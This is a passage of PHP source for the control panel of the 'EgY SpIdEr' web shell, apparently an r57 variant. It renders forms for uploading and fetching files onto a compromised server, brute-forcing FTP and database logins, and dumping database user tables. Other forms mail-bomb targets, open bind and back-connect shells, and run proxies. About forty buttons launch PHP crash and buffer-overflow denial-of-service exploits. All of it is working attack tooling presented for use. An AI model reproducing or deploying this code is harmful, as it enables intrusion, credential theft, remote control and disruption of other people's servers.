echo sr(0,"",$fs.in('hidden','dir',0,$dir).in('hidden','cmd',0,'test17_3').in('submit','submit',0,$lang[$language.'_butt8']).$fe);
echo $te."</td></tr>";
echo $te.'</div>'.$table_end1;  
}

echo $fs.$table_up1.div_title($lang[$language.'_text171'],'id98200').$table_up2.div('id98200').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('hidden','dir',0,$dir).in('hidden','cmd',0,'egy_5_2_3').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;


{
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo $table_up1.div_title($lang[$language.'_text5'],'id30').$table_up2.div('id30').$ts;
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile0',85,''));
echo sr(15,"<b>".$lang[$language.'_text21'].$arrow."</b>",in('checkbox','nf1 id=nf1',0,'1').in('text','new_name',82,'').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'</div>'.$table_end1.$fe;
}


{
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo $table_up1.div_title('Multy '.$lang[$language.'_text5'],'id34').$table_up2.div('id34').$ts;
echo "<tr><td valign=top width=50%>".$ts;
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile1',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile2',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile3',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile4',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile5',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile6',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile7',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile8',35,''));
echo $te."</td><td valign=top width=50%>".$ts;
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile9',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile10',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile11',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile12',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile13',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile14',35,''));
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile15',35,''));
echo sr(15,'',in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te."</td></tr>";
echo $te.'</div>'.$table_end1.$fe;
}


{
 echo $fs.$table_up1.div_title($lang[$language.'_text15'],'id31').$table_up2.div('id31').$ts;
 echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>",$select_downloaders.in('hidden','dir',0,$dir).ws(2)."<b>".$lang[$language.'_text17'].$arrow."</b>".in('text','rem_file',78,'http://'));
 echo sr(15,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',105,$dir.'/download.file').ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
 echo $te.'</div>'.$table_end1.$fe;
}

echo $fs.$table_up1.div_title($lang[$language.'_text86'],'id32').$table_up2.div('id32').$ts;
echo sr(15,"<b>".$lang[$language.'_text59'].$arrow."</b>",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt14']));
$arh = $lang[$language.'_text92'];
if(@function_exists('gzcompress')) { $arh .= in('radio','compress',0,'zip').' zip';   }
if(@function_exists('gzencode'))   { $arh .= in('radio','compress',0,'gzip').' gzip'; }
if(@function_exists('bzcompress')) { $arh .= in('radio','compress',0,'bzip').' bzip'; }
echo sr(15,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none',1).' '.$arh);
echo $te.'</div>'.$table_end1.$fe;

{
echo $table_up1.div_title($lang[$language.'_text93'],'id33').$table_up2.div('id33').$ts."<tr>".$fs."<td valign=top width=33%>".$ts;

echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text94']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',20,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))).in('hidden','cmd',0,'ftp_brute').in('hidden','dir',0,$dir));
echo sr(25,"",in('radio','brute_method',0,'passwd',1)."<font face=Verdana size=-2>".$lang[$language.'_text99']." ( <a href='".$_SERVER['PHP_SELF']."?users'>".$lang[$language.'_text95']."</a> )</font>");
echo sr(25,"",in('checkbox','reverse id=reverse',0,'1',1).$lang[$language.'_text101']);
echo sr(25,"",in('radio','brute_method',0,'dic',0).$lang[$language.'_text135']);
echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',0,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("root"))));
echo sr(25,"<b>".$lang[$language.'_text135'].$arrow."</b>",in('text','dictionary',0,(!empty($_POST['dictionary'])?($_POST['dictionary']):($dir.'passw.dic'))));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt1']));

echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text87']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',20,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',20,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',20,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("egy_spider@hotmail.com"))));
echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',20,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_down'));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',20,$dir));
echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option value=FTP_BINARY>FTP_BINARY</option><option value=FTP_ASCII>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt14']));

echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text100']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',20,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',20,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',20,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("egy_spider@hotmail.com"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',20,$dir));
echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',20,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_up'));
echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option value=FTP_BINARY>FTP_BINARY</option><option value=FTP_ASCII>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt2']));

echo $te."</td>".$fe."</tr></div></table>";
}


{
echo $table_up1.div_title($lang[$language.'_text102'],'id35').$table_up2.div('id35').$ts."<tr>".$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text103']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',30,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',30,(!empty($_POST['from'])?($_POST['from']):("egy_spider@hotmail.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',30,(!empty($_POST['subj'])?($_POST['subj']):("hello EgY SpIdEr"))));
echo sr(25,"<b>".$lang[$language.'_text108'].$arrow."</b>",'<textarea name=text cols=22 rows=2>'.(!empty($_POST['text'])?($_POST['text']):("mail text here")).'</textarea>');
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));

echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text104']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',30,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail_file').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',30,(!empty($_POST['from'])?($_POST['from']):("egy_spider@hotmail.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',30,(!empty($_POST['subj'])?($_POST['subj']):("file from egy spider shell"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',30,$dir));
echo sr(25,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none',1).' '.$arh);
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));

echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text139']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text105'].$arrow."</b>",in('text','to',30,(!empty($_POST['to'])?($_POST['to']):("hacker@mail.com"))).in('hidden','cmd',0,'mail_bomber').in('hidden','dir',0,$dir));
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',30,(!empty($_POST['from'])?($_POST['from']):("egy_spider@hotmail.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',30,(!empty($_POST['subj'])?($_POST['subj']):("hello EgY SpIdEr"))));
echo sr(25,"<b>".$lang[$language.'_text108'].$arrow."</b>",'<textarea name=text cols=22 rows=1>'.(!empty($_POST['text'])?($_POST['text']):("flood text here")).'</textarea>');
echo sr(25,"<b>Flood".$arrow."</b>",in('int','mail_flood',5,(!empty($_POST['mail_flood'])?($_POST['mail_flood']):100)).ws(4)."<b>Size(kb)".$arrow."</b>".in('int','mail_size',5,(!empty($_POST['mail_size'])?($_POST['mail_size']):10)));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt15']));

echo $te."</td>".$fe."</tr></div></table>";
}


{
$select = '<select name=db>';
if($mysql_on) $select .= '<option value=MySQL>MySQL</option>';
if($mssql_on) $select .= '<option value=MSSQL>MSSQL</option>';
if($pg_on)    $select .= '<option value=PostgreSQL>PostgreSQL</option>';
if($ora_on)   $select .= '<option value=Oracle>Oracle</option>';
if($mysqli_on)   $select .= '<option value=MySQLi>MySQLi</option>';
if($msql_on)   $select .= '<option value=mSQL>mSQL</option>';
if($sqlite_on)   $select .= '<option value=SQLite>SQLite</option>';
$select .= '</select>';

echo $table_up1.div_title($lang[$language.'_text82'],'id36').$table_up3.div('id36').$ts."<tr>".$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text134']."</div></b></font>";

echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select.in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_brute'));
echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',8,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',8,(!empty($_POST['db_port'])?($_POST['db_port']):(""))));
echo sr(35,"<b>".$lang[$language.'_text39'].$arrow."</b>",in('text','mysql_db',8,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
echo sr(25,"",in('radio','brute_method',0,'passwd',1)."<font face=Verdana size=-2>".$lang[$language.'_text99']." ( <a href='".$_SERVER['PHP_SELF']."?users'>".$lang[$language.'_text95']."</a> )</font>");
echo sr(25,"",in('checkbox','reverse id=reverse',0,'1',1).$lang[$language.'_text101']);
echo sr(25,"",in('radio','brute_method',0,'dic',0).$lang[$language.'_text135']);
echo sr(35,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','mysql_l',8,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))));
echo sr(25,"<b>".$lang[$language.'_text135'].$arrow."</b>",in('text','dictionary',0,(!empty($_POST['dictionary'])?($_POST['dictionary']):($dir.'passw.dic'))));
echo sr(35,"",in('submit','submit',0,$lang[$language.'_butt1']));

echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text40']."</div></b></font>";

echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',8,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',8,(!empty($_POST['db_port'])?($_POST['db_port']):(""))));
echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',8,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',8,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','mysql_db',8,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))).' <b>.</b> '.in('text','mysql_tbl',8,(!empty($_POST['mysql_tbl'])?($_POST['mysql_tbl']):("user"))));
echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump')."<b>".$lang[$language.'_text41'].$arrow."</b>",in('checkbox','dif id=dif',0,'1').in('text','dif_name',17,(!empty($_POST['dif_name'])?($_POST['dif_name']):("dump.sql"))));
echo sr(35,"",in('submit','submit',0,$lang[$language.'_butt9']));

echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text83']."</div></b></font>";

echo sr(35,"<b>".$lang[$language.'_text80'].$arrow."</b>",$select);
echo sr(35,"<b>".$lang[$language.'_text111'].$arrow."</b>",in('text','db_server',8,(!empty($_POST['db_server'])?($_POST['db_server']):("localhost"))).' <b>:</b> '.in('text','db_port',8,(!empty($_POST['db_port'])?($_POST['db_port']):(""))));
echo sr(35,"<b>".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow."</b>",in('text','mysql_l',8,(!empty($_POST['mysql_l'])?($_POST['mysql_l']):("root"))).' <b>:</b> '.in('text','mysql_p',8,(!empty($_POST['mysql_p'])?($_POST['mysql_p']):("password"))));
echo sr(35,"<b>".$lang[$language.'_text39'].$arrow."</b>",in('text','mysql_db',8,(!empty($_POST['mysql_db'])?($_POST['mysql_db']):("mysql"))));
echo sr(35,"<b>".$lang[$language.'_text84'].$arrow."</b>".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),"");
echo $te."<div align=center id='n'><textarea cols=30 rows=4 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSHOW TABLES;\nSELECT * FROM user;\nSELECT version();\nSELECT user();"))."</textarea><br>".in('submit','submit',0,$lang[$language.'_butt1'])."</div>";

echo "</td>".$fe."</tr></div></table>";
}


{
echo $table_up1.div_title($lang[$language.'_text81'],'id555555').$table_up2.div('id555555').$ts."<tr>".$fs."<td valign=top width=25%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text9']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text10'].$arrow."</b>",in('text','port',10,'11457'));
echo sr(40,"<b>".$lang[$language.'_text11'].$arrow."</b>",in('text','bind_pass',10,'r57'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt3']));
echo $te."</td>".$fe.$fs."<td valign=top width=25%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text12']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text13'].$arrow."</b>",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
echo sr(40,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','port',15,'11457'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
echo $te."</td>".$fe.$fs."<td valign=top width=25%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text22']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text23'].$arrow."</b>",in('text','local_port',10,'11457'));
echo sr(40,"<b>".$lang[$language.'_text24'].$arrow."</b>",in('text','remote_host',10,'irc.dalnet.ru'));
echo sr(40,"<b>".$lang[$language.'_text25'].$arrow."</b>",in('text','remote_port',10,'6667'));
echo sr(40,"<b>".$lang[$language.'_text26'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">datapipe.pl</option><option value=\"C\">datapipe.c</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
echo $te."</td>".$fe.$fs."<td valign=top width=25%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>Proxy</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text10'].$arrow."</b>",in('text','proxy_port',10,'31337'));
echo sr(40,"<b>".$lang[$language.'_text26'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
echo $te."</td>".$fe."</tr></div></table>";
}
echo $table_up1.div_title($lang[$language.'_text81'],'id5525555').$table_up2.div('id5525555').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text9']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text10'].$arrow."</b>",in('text','port1',35,'9999').ws(4).in('submit','submit',0,$lang[$language.'_butt3']));
echo $te."</td>".$fe."</tr></div></table>";

echo $table_up1.div_title($lang[$language.'_text140'],'id38').$table_up2.div('id38').$ts."<tr><td valign=top width=25%>".$ts;
echo "<font face=Verdana color=red size=-2><b><div align=center id='n'>".$lang[$language.'_text141']."</div></b></font>";
echo sr(10,"",$fs.in('hidden','cmd',0,'dos1').in('submit','submit',0,'Recursive memory exhaustion').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos2').in('submit','submit',0,'Memory_limit [pack()]').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos3').in('submit','submit',0,'BoF [unserialize()]').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos4').in('submit','submit',0,'BoF ZendEngine').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos5').in('submit','submit',0,'SQlite [dl()] vuln').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos6').in('submit','submit',0,'PCRE [preg_match()](PHP<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos7').in('submit','submit',0,'Mem_limit [str_repeat()](PHP<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos8').in('submit','submit',0,'Apache process killer').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos9').in('submit','submit',0,'Overload [tempnam()](PHP<5.1.2)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos10').in('submit','submit',0,'BoF [wordwrap()](PHP<5.1.2)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos11').in('submit','submit',0,'BoF [array_fill()](PHP<5.1.2)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos12').in('submit','submit',0,'BoF [substr_compare()](PHP<5.1.2)').$fe);
echo $te."</td><td valign=top width=25%>".$ts;
echo "<font face=Verdana color=red size=-2><b><div align=center id='n'>".$lang[$language.'_text141']."</div></b></font>";
echo sr(10,"",$fs.in('hidden','cmd',0,'dos13').in('submit','submit',0,'Arr. Cr. 64b[unserialize()](PHP<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos14').in('submit','submit',0,'BoF [str_ireplace()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos15').in('submit','submit',0,'BoF [htmlentities()](PHP<5.1.6,4.4.4)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos16').in('submit','submit',0,'BoF [zip_entry_read()](PHP<4.4.5)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos17').in('submit','submit',0,'BoF [sqlite_udf_decode_binary()](PHP<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos18').in('submit','submit',0,'BoF [msg_receive()](PHP<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos19').in('submit','submit',0,'BoF [php_stream_filter_create()](PHP5<5.2.1)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos20').in('submit','submit',0,'BoF [unserialize()](PHP<4.4.4)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos21').in('submit','submit',0,'BoF [gdImageCreateTrueColor()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos22').in('submit','submit',0,'BoF [gdImageCopyResized()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos23').in('submit','submit',0,'DoS [iconv_substr()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos24').in('submit','submit',0,'DoS [setlocale()](PHP<5.2.x)').$fe);
echo $te."</td><td valign=top width=25%>".$ts;
echo "<font face=Verdana color=red size=-2><b><div align=center id='n'>".$lang[$language.'_text141']."</div></b></font>";
echo sr(10,"",$fs.in('hidden','cmd',0,'dos25').in('submit','submit',0,'DoS [glob()] 1 (PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos26').in('submit','submit',0,'DoS [glob()] 2 (PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos27').in('submit','submit',0,'DoS [fnmatch()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos28').in('submit','submit',0,'BoF [imagepsloadfont()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos29').in('submit','submit',0,'BoF mSQL [msql_connect](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos30').in('submit','submit',0,'BoF [chunk_split()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos31').in('submit','submit',0,'BoF [php_win32sti.dl](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos32').in('submit','submit',0,'BoF [php_iisfunc.dll](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos33').in('submit','submit',0,'BoF [ntuser_getuserlist()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos34').in('submit','submit',0,'DoS [com_print_typeinfo()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos35').in('submit','submit',0,'BoF [iconv()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos36').in('submit','submit',0,'BoF [iconv_m_d_headers()](PHP<5.2.x)').$fe);
echo $te."</td><td valign=top width=25%>".$ts;
echo "<font face=Verdana color=red size=-2><b><div align=center id='n'>".$lang[$language.'_text141']."</div></b></font>";
echo sr(10,"",$fs.in('hidden','cmd',0,'dos37').in('submit','submit',0,'BoF [iconv_mime_decode()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos38').in('submit','submit',0,'BoF [iconv_strlen()](PHP<5.2.x)').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos39').in('submit','submit',0,'BoF [printf()](PHP<5.2.5) and prior').$fe);
echo sr(10,"",$fs.in('hidden','cmd',0,'dos40').in('submit','submit',0,'BoF [mssql_connect(), mssql_pconnect()](PHP<4.4.6) and prior').$fe);
/*echo sr(10,"",$fs.in('hidden','cmd',0,'dos').in('submit','submit',0,'BoF [()](PHP<5.2.x)').$fe);*/
echo $te."</td></tr></div></table>";
echo $fs.$table_up1.div_title($lang[$language.'_text211'],'id11111').$table_up2.div('id11111').$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text213']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>",in('text','htacces',10,'.htaccess').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text218']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>",in('text','egy_ini',10,'ini.php').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text228']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>",in('text','egy_vb',10,'vb_hacker.php').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text230']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>",in('text','egy_cp',10,'pass_cpanel.php').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo $te.'</div>'.$table_end1.$fe;
{



echo $te."</td>".$fe."</tr></div></table>";
}

echo $te."</td></tr></div></table>";
echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=tahoma size=-2><b>o---[ EgY_SpIdEr | </a> | <a egy_spider@hotmail.com>egy_spider@hotmail.com</a> developer by EgY SpIdEr   ]---o</b></font></div></td></tr></table>";
echo '</body></html>';
?>
